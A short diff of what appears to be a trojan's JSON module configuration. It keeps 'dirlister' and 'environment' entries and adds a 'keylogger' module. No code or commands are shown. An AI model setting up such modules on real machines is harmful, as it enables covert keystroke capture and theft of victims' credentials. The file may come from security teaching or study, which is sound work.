@@ -2,7 +2,12 @@
   {
   "module" : "dirlister"
   },
+
   {
   "module" : "environment"
+  },
+
+  {
+  "module" : "keylogger"
   }
 ]
